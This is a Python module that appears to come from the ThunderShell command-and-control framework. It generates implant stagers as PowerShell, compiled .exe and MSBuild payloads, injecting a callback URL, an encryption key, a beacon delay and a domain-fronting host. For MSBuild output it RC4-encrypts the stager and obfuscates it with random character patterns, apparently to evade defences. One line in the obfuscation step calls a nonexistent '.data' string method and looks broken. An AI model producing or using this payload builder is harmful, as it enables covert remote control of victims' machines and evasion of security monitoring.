#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/payload.py
"""

import os
import base64
import random

from core.vars import THUNDERSHELL
from core.utils import Utils
from core.rc4 import RC4

class Payload:

    DEFAULT_DELAY = 10000
    DEFAULT_TYPE = "ps1"

    def __init__(self, config):
        self.config = config
        self.fronting = None
        self.type = {}
        self.type["ps1"] = "%s/stager.ps1" % THUNDERSHELL.PAYLOADS_PATH

        # self.type["js"] = "stager.ps1"
        # self.type["hta"] = "stager.ps1"

        self.type["exe"] = "%s/stager.cs" % THUNDERSHELL.PAYLOADS_PATH
        self.type["exe-old"] = "%s/stager.cs" % THUNDERSHELL.PAYLOADS_PATH
        self.type["cs"] = "%s/stager.cs" % THUNDERSHELL.PAYLOADS_PATH
        self.type["msbuild"] = "%s/stager.ps1" % THUNDERSHELL.PAYLOADS_PATH

        self.delay = Payload.DEFAULT_DELAY
        self.option = Payload.DEFAULT_TYPE

    def set_type(self, type):
        if type in self.type:
            self.option = type

    def set_fronting(self, fronting):
        self.fronting = fronting

    def get_fronting(self):
        if self.fronting == None:
            # the last replace get rid of unwanted / at the end of the callback_url
            return self.callback_url[self.callback_url.find("://") + 3:].replace("/", "") 
        return self.fronting

    def set_delay(self, delay):
        try:
            self.delay = int(delay)
        except:
            self.delay = Payload.DEFAULT_DELAY

    def set_callback(self, url):
        if url != "__default__" and url != "":
            self.callback_url = Utils.url_decode(url)
        else:
            self.callback_url = self.get_url()

    def get_output(self):
        output = Utils.load_powershell_script(self.type[self.option], 999)
        output = output.replace("[URL]", self.callback_url).replace("[KEY]", self.config.get("encryption-key")).replace("[DELAY]", str(self.delay)).replace("[FRONTING]", self.get_fronting())
        if self.option == "exe":
            output = self.compile_exe(output)
        if self.option == "exe-old":
            output = self.compile_exe(output, v1=True)            
        if self.option == "msbuild":
            output = self.generate_msbuild(output)
        return output

    def compile_exe(self, data, v1=False):
        output = ""
        filename = "/tmp/%s" % Utils.gen_str(10)
        open(filename, "w+").write(data)
        ver = "-v1" if v1 else ""
        cmdline = \
            "mcs %s -out:%s.exe -r:%sSystem.Drawing.dll -r:%sSystem.Management.Automation%s.dll -r:%sSystem.Web.Extensions.dll -r:%sSystem.Windows.Forms.dll > /dev/null 2>&1" \
            % (filename, filename, THUNDERSHELL.DATA_BIN_PATH, THUNDERSHELL.DATA_BIN_PATH, ver, THUNDERSHELL.DATA_BIN_PATH, THUNDERSHELL.DATA_BIN_PATH)

        os.system(cmdline)
        output = open("%s.exe" % filename, "rb").read()
        os.remove(filename)
        os.remove("%s.exe" % filename)

        return output

    def generate_msbuild(self, ps):
        msbuild = Utils.load_powershell_script("%s/stager.csproj" % THUNDERSHELL.PAYLOADS_PATH, 999)
        rc4_key = RC4.gen_rc4_key(32)
        hex_rc4_key = RC4.format_rc4_key(rc4_key)
        rc4 = RC4(rc4_key)
        data = base64.b64encode(rc4.crypt(ps))
        pattern1 = self.gen_pattern("#!@$%?&/-~")
        pattern2 = self.gen_pattern(",.<>)(*[]{}+`")    
        data = data.replace("m", pattern1).data("V", pattern2)
        return msbuild.replace("[PAYLOAD]", data).replace("[KEY]", hex_rc4_key).replace("[PATTERN_1]", pattern1).replace("[PATTERN_2]", pattern2)

    def get_url(self):
        return self.config.get("callback-url")
    
    def gen_pattern(self, charset):    
        return ''.join(random.sample(charset,len(charset)))
